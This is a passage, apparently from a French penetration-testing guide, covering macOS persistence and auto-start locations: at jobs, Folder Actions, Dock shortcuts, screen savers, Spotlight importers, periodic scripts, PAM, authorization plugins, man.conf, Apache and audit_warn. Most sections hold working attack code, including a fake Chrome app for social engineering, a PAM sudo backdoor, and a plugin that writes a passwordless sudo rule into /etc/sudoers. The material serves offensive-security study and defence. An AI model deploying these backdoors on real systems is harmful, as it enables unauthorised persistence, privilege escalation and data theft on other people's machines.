SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Si les tâches AT ne sont pas activées, les tâches créées ne seront pas exécutées.

Les **fichiers de travail** peuvent être trouvés à `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Le nom de fichier contient la file d'attente, le numéro de travail et l'heure à laquelle il est prévu de s'exécuter. Par exemple, prenons un aperçu de `a0001a019bdcd2`.

- `a` - c'est la file d'attente
- `0001a` - numéro de travail en hexadécimal, `0x1a = 26`
- `019bdcd2` - temps en hexadécimal. Il représente les minutes écoulées depuis l'époque. `0x019bdcd2` est `26991826` en décimal. Si nous le multiplions par 60, nous obtenons `1619509560`, ce qui correspond à `GMT: 2021. Avril 27., Mardi 7:46:00`.

Si nous imprimons le fichier de travail, nous constatons qu'il contient les mêmes informations que celles obtenues en utilisant `at -c`.

### Actions de dossier

Écriture : [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Écriture : [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez être en mesure d'appeler `osascript` avec des arguments pour contacter **`System Events`** afin de pouvoir configurer les Actions de dossier
- Contournement TCC : [🟠](https://emojipedia.org/large-orange-circle)
- Il a quelques autorisations TCC de base comme Bureau, Documents et Téléchargements

#### Emplacement

- **`/Library/Scripts/Folder Action Scripts`**
- Root requis
- **Déclencheur** : Accès au dossier spécifié
- **`~/Library/Scripts/Folder Action Scripts`**
- **Déclencheur** : Accès au dossier spécifié

#### Description & Exploitation

Les Actions de dossier sont des scripts automatiquement déclenchés par des changements dans un dossier tels que l'ajout, la suppression d'éléments, ou d'autres actions comme l'ouverture ou le redimensionnement de la fenêtre du dossier. Ces actions peuvent être utilisées pour diverses tâches et peuvent être déclenchées de différentes manières, comme en utilisant l'interface Finder ou des commandes terminal.

Pour configurer les Actions de dossier, vous avez des options comme :

1. Créer un flux de travail d'Action de dossier avec [Automator](https://support.apple.com/guide/automator/welcome/mac) et l'installer en tant que service.
2. Attacher un script manuellement via la configuration des Actions de dossier dans le menu contextuel d'un dossier.
3. Utiliser OSAScript pour envoyer des messages Apple Event à `System Events.app` pour configurer programmétiquement une Action de dossier.
- Cette méthode est particulièrement utile pour intégrer l'action dans le système, offrant un niveau de persistance.

Le script suivant est un exemple de ce qui peut être exécuté par une Action de dossier :
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Pour rendre le script ci-dessus utilisable par les Actions de Dossier, compilez-le en utilisant :
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Après la compilation du script, configurez les actions de dossier en exécutant le script ci-dessous. Ce script activera les actions de dossier globalement et attachera spécifiquement le script précédemment compilé au dossier Bureau.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Exécutez le script de configuration avec :
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Voici comment implémenter cette persistance via l'interface graphique :

Voici le script qui sera exécuté :
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compilez-le avec : `osacompile -l JavaScript -o folder.scpt source.js`

Déplacez-le vers :
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ensuite, ouvrez l'application `Folder Actions Setup`, sélectionnez le **dossier que vous souhaitez surveiller** et sélectionnez dans votre cas **`folder.scpt`** (dans mon cas, je l'ai appelé output2.scp) :

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Maintenant, si vous ouvrez ce dossier avec **Finder**, votre script sera exécuté.

Cette configuration a été stockée dans le **plist** situé dans **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** au format base64.

Maintenant, essayons de préparer cette persistance sans accès GUI :

1. **Copiez `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dans `/tmp` pour le sauvegarder :
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Supprimez** les actions de dossier que vous venez de définir :

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Maintenant que nous avons un environnement vide

3. Copiez le fichier de sauvegarde : `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ouvrez l'application Folder Actions Setup.app pour consommer cette configuration : `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Et cela n'a pas fonctionné pour moi, mais ce sont les instructions du rapport :

### Raccourcis Dock

Rapport : [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez avoir installé une application malveillante dans le système
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `~/Library/Preferences/com.apple.dock.plist`
- **Déclencheur** : Lorsque l'utilisateur clique sur l'application dans le dock

#### Description & Exploitation

Toutes les applications qui apparaissent dans le Dock sont spécifiées dans le plist : **`~/Library/Preferences/com.apple.dock.plist`**

Il est possible d'**ajouter une application** juste avec :
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
En utilisant un **ingénierie sociale**, vous pourriez **vous faire passer par exemple pour Google Chrome** dans le dock et exécuter en réalité votre propre script :
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Sélecteurs de Couleur

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Une action très spécifique doit se produire
- Vous finirez dans un autre sandbox
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/Library/ColorPickers`
- Accès root requis
- Déclencheur : Utilisez le sélecteur de couleur
- `~/Library/ColorPickers`
- Déclencheur : Utilisez le sélecteur de couleur

#### Description & Exploit

**Compilez un sélecteur de couleur** bundle avec votre code (vous pourriez utiliser [**celui-ci par exemple**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructeur (comme dans la [section Économiseur d'Écran](macos-auto-start-locations.md#screen-saver)) et copiez le bundle dans `~/Library/ColorPickers`.

Ensuite, lorsque le sélecteur de couleur est déclenché, votre code devrait l'être aussi.

Notez que le binaire chargeant votre bibliothèque a un **sandbox très restrictif** : `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Écriture** : [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Écriture** : [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Utile pour contourner le sandbox : **Non, car vous devez exécuter votre propre application**
- Contournement TCC : ???

#### Emplacement

- Une application spécifique

#### Description & Exploit

Un exemple d'application avec une extension Finder Sync [**peut être trouvé ici**](https://github.com/D00MFist/InSync).

Les applications peuvent avoir des `Finder Sync Extensions`. Cette extension ira à l'intérieur d'une application qui sera exécutée. De plus, pour que l'extension puisse exécuter son code, elle **doit être signée** avec un certificat de développeur Apple valide, elle doit être **sandboxée** (bien que des exceptions assouplies puissent être ajoutées) et elle doit être enregistrée avec quelque chose comme :
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Économiseur d'écran

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous finirez dans un bac à sable d'application commun
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/System/Library/Screen Savers`
- Root requis
- **Déclencheur** : Sélectionnez l'économiseur d'écran
- `/Library/Screen Savers`
- Root requis
- **Déclencheur** : Sélectionnez l'économiseur d'écran
- `~/Library/Screen Savers`
- **Déclencheur** : Sélectionnez l'économiseur d'écran

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Créez un nouveau projet dans Xcode et sélectionnez le modèle pour générer un nouvel **Économiseur d'écran**. Ensuite, ajoutez votre code, par exemple le code suivant pour générer des journaux.

**Construisez**-le, et copiez le bundle `.saver` dans **`~/Library/Screen Savers`**. Ensuite, ouvrez l'interface graphique de l'économiseur d'écran et si vous cliquez dessus, cela devrait générer beaucoup de journaux :
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Notez qu'en raison de la présence de **`com.apple.security.app-sandbox`** dans les droits du binaire qui charge ce code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), vous serez **dans le bac à sable d'application commun**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous finirez dans un bac à sable d'application
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)
- Le bac à sable semble très limité

#### Emplacement

- `~/Library/Spotlight/`
- **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin spotlight est créé.
- `/Library/Spotlight/`
- **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin spotlight est créé.
- Root requis
- `/System/Library/Spotlight/`
- **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin spotlight est créé.
- Root requis
- `Some.app/Contents/Library/Spotlight/`
- **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin spotlight est créé.
- Nouvelle application requise

#### Description & Exploitation

Spotlight est la fonction de recherche intégrée de macOS, conçue pour fournir aux utilisateurs un **accès rapide et complet aux données sur leurs ordinateurs**.\
Pour faciliter cette capacité de recherche rapide, Spotlight maintient une **base de données propriétaire** et crée un index en **analysant la plupart des fichiers**, permettant des recherches rapides à travers les noms de fichiers et leur contenu.

Le mécanisme sous-jacent de Spotlight implique un processus central nommé 'mds', qui signifie **'serveur de métadonnées'.** Ce processus orchestre l'ensemble du service Spotlight. Complétant cela, il existe plusieurs démons 'mdworker' qui effectuent une variété de tâches de maintenance, telles que l'indexation de différents types de fichiers (`ps -ef | grep mdworker`). Ces tâches sont rendues possibles grâce aux plugins d'importation Spotlight, ou **".mdimporter bundles**", qui permettent à Spotlight de comprendre et d'indexer le contenu à travers une gamme diversifiée de formats de fichiers.

Les plugins ou **`.mdimporter`** bundles sont situés dans les endroits mentionnés précédemment et si un nouveau bundle apparaît, il est chargé en un instant (pas besoin de redémarrer de service). Ces bundles doivent indiquer quel **type de fichier et quelles extensions ils peuvent gérer**, de cette façon, Spotlight les utilisera lorsqu'un nouveau fichier avec l'extension indiquée est créé.

Il est possible de **trouver tous les `mdimporters`** chargés en cours d'exécution :
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Et par exemple **/Library/Spotlight/iBooksAuthor.mdimporter** est utilisé pour analyser ces types de fichiers (extensions `.iba` et `.book` parmi d'autres) :
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Si vous vérifiez le Plist d'autres `mdimporter`, vous ne trouverez peut-être pas l'entrée **`UTTypeConformsTo`**. C'est parce que c'est un _Identificateur de Type Uniforme_ intégré ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) et il n'est pas nécessaire de spécifier des extensions.
>
> De plus, les plugins par défaut du système ont toujours la priorité, donc un attaquant ne peut accéder qu'aux fichiers qui ne sont pas autrement indexés par les propres `mdimporters` d'Apple.

Pour créer votre propre importateur, vous pourriez commencer par ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) puis changer le nom, le **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** afin qu'il prenne en charge l'extension que vous souhaitez prendre en charge et les refléter dans **`schema.xml`**.\
Ensuite, **changez** le code de la fonction **`GetMetadataForFile`** pour exécuter votre payload lorsqu'un fichier avec l'extension traitée est créé.

Enfin, **construisez et copiez votre nouveau `.mdimporter`** dans l'un des emplacements précédents et vous pouvez vérifier s'il est chargé **en surveillant les journaux** ou en vérifiant **`mdimport -L.`**

### ~~Panneau de Préférences~~

> [!CAUTION]
> Il ne semble pas que cela fonctionne encore.

Écriture : [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Cela nécessite une action spécifique de l'utilisateur
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Il ne semble pas que cela fonctionne encore.

## Contournement du Sandbox Root

> [!TIP]
> Ici, vous pouvez trouver des emplacements de démarrage utiles pour le **contournement du sandbox** qui vous permet d'exécuter simplement quelque chose en **l'écrivant dans un fichier** en étant **root** et/ou nécessitant d'autres **conditions étranges.**

### Périodique

Écriture : [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root requis
- **Déclencheur** : Quand le moment est venu
- `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
- Root requis
- **Déclencheur** : Quand le moment est venu

#### Description & Exploitation

Les scripts périodiques (**`/etc/periodic`**) sont exécutés en raison des **démarrages de lancement** configurés dans `/System/Library/LaunchDaemons/com.apple.periodic*`. Notez que les scripts stockés dans `/etc/periodic/` sont **exécutés** en tant que **propriétaire du fichier**, donc cela ne fonctionnera pas pour une éventuelle élévation de privilèges.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Il existe d'autres scripts périodiques qui seront exécutés indiqués dans **`/etc/defaults/periodic.conf`** :
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si vous parvenez à écrire l'un des fichiers `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, il sera **exécuté tôt ou tard**.

> [!WARNING]
> Notez que le script périodique sera **exécuté en tant que propriétaire du script**. Donc, si un utilisateur régulier possède le script, il sera exécuté en tant que cet utilisateur (cela pourrait empêcher les attaques d'escalade de privilèges).

### PAM

Écriture : [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Écriture : [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Root toujours requis

#### Description & Exploitation

Comme PAM est plus axé sur la **persistance** et les logiciels malveillants que sur une exécution facile dans macOS, ce blog ne donnera pas d'explication détaillée, **lisez les écrits pour mieux comprendre cette technique**.

Vérifiez les modules PAM avec :
```bash
ls -l /etc/pam.d
```
Une technique de persistance/élévation de privilèges abusant de PAM est aussi simple que de modifier le module /etc/pam.d/sudo en ajoutant au début la ligne :
```bash
auth       sufficient     pam_permit.so
```
Alors cela **ressemblera** à quelque chose comme ceci :
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Et donc, toute tentative d'utiliser **`sudo` fonctionnera**.

> [!CAUTION]
> Notez que ce répertoire est protégé par TCC, il est donc très probable que l'utilisateur reçoive une invite demandant l'accès.

Un autre bon exemple est su, où vous pouvez voir qu'il est également possible de donner des paramètres aux modules PAM (et vous pourriez également backdoor ce fichier) :
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugins d'autorisation

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root et faire des configurations supplémentaires
- Contournement TCC : ???

#### Emplacement

- `/Library/Security/SecurityAgentPlugins/`
- Root requis
- Il est également nécessaire de configurer la base de données d'autorisation pour utiliser le plugin

#### Description & Exploitation

Vous pouvez créer un plugin d'autorisation qui sera exécuté lorsqu'un utilisateur se connecte pour maintenir la persistance. Pour plus d'informations sur la façon de créer l'un de ces plugins, consultez les writeups précédents (et faites attention, un plugin mal écrit peut vous verrouiller et vous devrez nettoyer votre mac depuis le mode de récupération).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Déplacez** le bundle vers l'emplacement à charger :
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Enfin, ajoutez la **règle** pour charger ce Plugin :
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Le **`evaluate-mechanisms`** indiquera au cadre d'autorisation qu'il devra **appeler un mécanisme externe pour l'autorisation**. De plus, **`privileged`** fera en sorte qu'il soit exécuté par root.

Déclenchez-le avec :
```bash
security authorize com.asdf.asdf
```
Et ensuite, le **groupe du personnel devrait avoir un accès sudo** (lisez `/etc/sudoers` pour confirmer).

### Man.conf

Écriture : [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root et l'utilisateur doit utiliser man
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/private/etc/man.conf`**
- Root requis
- **`/private/etc/man.conf`** : Chaque fois que man est utilisé

#### Description & Exploit

Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser lors de l'ouverture des fichiers de documentation man. Ainsi, le chemin vers l'exécutable pourrait être modifié pour que chaque fois que l'utilisateur utilise man pour lire des docs, une porte dérobée soit exécutée.

Par exemple, défini dans **`/private/etc/man.conf`** :
```
MANPAGER /tmp/view
```
Et ensuite créez `/tmp/view` comme :
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Écriture**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root et apache doit être en cours d'exécution
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)
- Httpd n'a pas d'autorisations

#### Emplacement

- **`/etc/apache2/httpd.conf`**
- Root requis
- Déclencheur : Lorsque Apache2 est démarré

#### Description & Exploit

Vous pouvez indiquer dans `/etc/apache2/httpd.conf` de charger un module en ajoutant une ligne telle que :
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
De cette façon, votre module compilé sera chargé par Apache. La seule chose est que vous devez soit **le signer avec un certificat Apple valide**, soit **ajouter un nouveau certificat de confiance** dans le système et **le signer** avec celui-ci.

Ensuite, si nécessaire, pour vous assurer que le serveur sera démarré, vous pourriez exécuter :
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemple de code pour le Dylb :
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Cadre d'audit BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root, auditd doit être en cours d'exécution et provoquer un avertissement
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/etc/security/audit_warn`**
- Root requis
- **Déclencheur** : Lorsque auditd détecte un avertissement

#### Description & Exploit

Chaque fois qu'auditd détecte un avertissement, le script **`/etc/security/audit_warn`** est **exécuté**. Vous pourriez donc y ajouter votre charge utile.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Vous pouvez forcer un avertissement avec `sudo audit -n`.

### Éléments de démarrage

> [!CAUTION] > **Ceci est obsolète, donc rien ne devrait être trouvé dans ces répertoires.**

Le **StartupItem** est un répertoire qui doit être positionné soit dans `/Library/StartupItems/`, soit dans `/System/Library/StartupItems/`. Une fois ce répertoire établi, il doit contenir deux fichiers spécifiques :

1. Un **script rc** : Un script shell exécuté au démarrage.
2. Un **fichier plist**, spécifiquement nommé `StartupParameters.plist`, qui contient divers paramètres de configuration.

Assurez-vous que le script rc et le fichier `StartupParameters.plist` sont correctement placés dans le répertoire **StartupItem** pour que le processus de démarrage puisse les reconnaître et les utiliser.

{{#tabs}}
